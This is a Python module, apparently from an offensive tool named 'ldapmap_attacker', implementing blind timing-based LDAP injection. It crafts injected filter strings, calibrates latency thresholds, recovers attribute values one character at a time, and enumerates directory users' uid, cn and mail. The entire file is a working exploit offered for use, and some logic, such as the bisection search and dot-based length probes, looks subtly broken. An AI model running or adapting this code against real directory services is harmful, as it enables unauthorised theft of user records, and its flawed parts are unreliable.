import time

from ldapmap_attacker.lib.logger import setup_logger

logger = setup_logger()


class BlindAttributeEnumerator:
    def __init__(self, requester, baseline_time=1.0, threshold_multiplier=2.0, candidate_charset=None):
        self.requester = requester
        self.baseline_time = baseline_time
        self.threshold_multiplier = threshold_multiplier
        self.timing_threshold = baseline_time * threshold_multiplier
        self.candidate_charset = candidate_charset or [chr(codepoint) for codepoint in range(32, 127)]
        self.recovered_characters = 0

    def _measure_probe_latency(self, payload):
        started_at = time.time()
        try:
            if hasattr(self.requester, "_make_request"):
                self.requester._make_request(payload)
            else:
                self.requester.request(payload)
        except Exception as exc:
            logger.debug(f"Blind timing probe failed for payload '{payload}': {exc}")
        return time.time() - started_at

    def _build_prefix_probe(self, attribute_name, known_prefix, candidate_char):
        return f"*)({attribute_name}={known_prefix}{candidate_char}*"

    def calibrate_timing(self, match_payload, miss_payload, samples=5):
        logger.info("Calibrating timing baseline for blind LDAP extraction...")

        match_latencies = []
        miss_latencies = []

        for _ in range(samples):
            match_latencies.append(self._measure_probe_latency(match_payload))
            time.sleep(0.1)
            miss_latencies.append(self._measure_probe_latency(miss_payload))
            time.sleep(0.1)

        avg_match = sum(match_latencies) / len(match_latencies)
        avg_miss = sum(miss_latencies) / len(miss_latencies)

        self.baseline_time = avg_miss
        self.timing_threshold = avg_miss + (avg_match - avg_miss) * 0.7
        logger.success(
            f"Timing baseline calibrated: baseline={self.baseline_time:.3f}s threshold={self.timing_threshold:.3f}s"
        )

    def is_truthy_probe(self, payload):
        response_time = self._measure_probe_latency(payload)
        return response_time > self.timing_threshold

    def recover_next_character(self, attribute_name, position, known_prefix=""):
        for candidate_char in self.candidate_charset:
            payload = self._build_prefix_probe(attribute_name, known_prefix, candidate_char)
            if self.is_truthy_probe(payload):
                logger.debug(
                    f"Recovered attribute '{attribute_name}' position {position}: {candidate_char!r}"
                )
                return candidate_char

        return None

    def recover_attribute_value(self, attribute_name, max_length=50):
        logger.info(f"Recovering LDAP attribute '{attribute_name}' via timing side channel...")
        recovered_value = ""

        for position in range(max_length):
            next_char = self.recover_next_character(attribute_name, position, recovered_value)
            if next_char is None:
                break

            recovered_value += next_char
            self.recovered_characters += 1
            logger.vuln(f"{attribute_name}={recovered_value}")

        return recovered_value

    def estimate_attribute_length(self, attribute_name, max_length=100):
        for candidate_length in range(1, max_length + 1):
            payload = f"*)({attribute_name}={'.' * candidate_length})"
            if not self.is_truthy_probe(payload):
                return candidate_length - 1
        return max_length

    def estimate_entry_count(self, base_filter="(objectClass=person)", max_entries=1000):
        for candidate_count in range(1, max_entries + 1):
            payload = f")({base_filter})(cn={'.' * candidate_count}*"
            if not self.is_truthy_probe(payload):
                return candidate_count - 1
        return max_entries

    def bisect_character_search(self, attribute_name, position, known_prefix=""):
        ordered_charset = sorted(self.candidate_charset)
        low = 0
        high = len(ordered_charset) - 1

        while low <= high:
            mid = (low + high) // 2
            candidate_char = ordered_charset[mid]
            payload = self._build_prefix_probe(attribute_name, known_prefix, candidate_char)

            if self.is_truthy_probe(payload):
                if high - low <= 1:
                    return candidate_char
                high = mid
            else:
                low = mid + 1

        return None

    def recover_entry_snapshot(self, entry_index, attributes):
        logger.info(f"Recovering attribute snapshot for LDAP entry #{entry_index}...")
        entry_snapshot = {}

        for attribute_name in attributes:
            recovered_value = self.recover_attribute_value(attribute_name, max_length=30)
            if recovered_value:
                entry_snapshot[attribute_name] = recovered_value

        return entry_snapshot

    def enumerate_users_blind(self):
        recovered_users = []
        estimated_entries = self.estimate_entry_count()
        logger.success(f"Blind enumeration suggests approximately {estimated_entries} directory entries")

        for entry_index in range(min(estimated_entries, 10)):
            user_snapshot = self.recover_entry_snapshot(entry_index, ["uid", "cn", "mail"])
            if user_snapshot:
                recovered_users.append(user_snapshot)

        return recovered_users

    def check_bool(self, payload):
        return self.is_truthy_probe(payload)

    def guess_letter(self, ldap_attr, idx, known_so_far=""):
        return self.recover_next_character(ldap_attr, idx, known_so_far)

    def pull_out_value(self, ldap_attr, max_len=50):
        return self.recover_attribute_value(ldap_attr, max_len)

    def get_attr_len(self, ldap_attr):
        return self.estimate_attribute_length(ldap_attr)

    def count_ldap_entries(self, fltr="(objectClass=person)"):
        return self.estimate_entry_count(fltr)

    def bisect_search_char(self, ldap_attr, idx, prefix=""):
        return self.bisect_character_search(ldap_attr, idx, prefix)

    def grab_entry_at_pos(self, pos, attrs_to_grab):
        return self.recover_entry_snapshot(pos, attrs_to_grab)

    def enum_users_no_output(self):
        return self.enumerate_users_blind()


LdapBlindExploiter = BlindAttributeEnumerator
